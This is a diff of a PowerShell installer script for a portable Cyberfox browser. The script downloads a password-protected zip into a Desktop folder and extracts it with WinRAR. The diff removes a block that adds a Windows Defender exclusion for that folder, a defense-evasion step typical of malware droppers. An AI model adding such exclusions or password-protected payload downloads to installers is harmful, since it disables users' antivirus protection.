@@ -1,5 +1,3 @@
-# cyberfox-install.ps1
-
 # Variables
 $desktopPath = [Environment]::GetFolderPath("Desktop")
 $awsFolder = Join-Path $desktopPath "AWS"
@@ -58,25 +56,12 @@ if (-Not (Test-Path $awsFolder)) {
     Write-Host "AWS folder found: $awsFolder"
 }
 
-# Check or create Cyberfox Portable folder
+# Inside AWS, check or create Cyberfox Portable folder
 if (-Not (Test-Path $cyberfoxPortableFolder)) {
     New-Item -ItemType Directory -Path $cyberfoxPortableFolder | Out-Null
     Write-Host "Created Cyberfox Portable folder: $cyberfoxPortableFolder"
 } else {
     Write-Host "Cyberfox Portable folder found: $cyberfoxPortableFolder"
-}
-
-# Add Defender exclusion for Cyberfox Portable folder
-try {
-    $existingExclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
-    if ($existingExclusions -notcontains $cyberfoxPortableFolder) {
-        Write-Host "Adding Defender exclusion for: $cyberfoxPortableFolder"
-        Add-MpPreference -ExclusionPath $cyberfoxPortableFolder
-    } else {
-        Write-Host "Defender exclusion already exists for: $cyberfoxPortableFolder"
-    }
-} catch {
-    Write-Warning "Failed to add Defender exclusion. Run PowerShell as Administrator."
 }
 
 # Download the zip into Cyberfox Portable folder
@@ -89,7 +74,7 @@ try {
     exit 1
 }
 
-# Extract zip using WinRAR with password
+# Extract using WinRAR with password
 Write-Host "Extracting zip with password..."
 $extractArgs = @(
     "x",
@@ -114,12 +99,3 @@ Remove-Item $zipFile
 Write-Host "Deleted zip file."
 
 Write-Host "All done! Files extracted to $cyberfoxPortableFolder"
-
-# Open Cyberfox Portable folder in File Explorer
-Start-Process explorer.exe $cyberfoxPortableFolder
-
-# Close PowerShell window if running in ConsoleHost
-if ($host.Name -eq 'ConsoleHost') {
-    Start-Sleep -Seconds 1
-    exit
-}
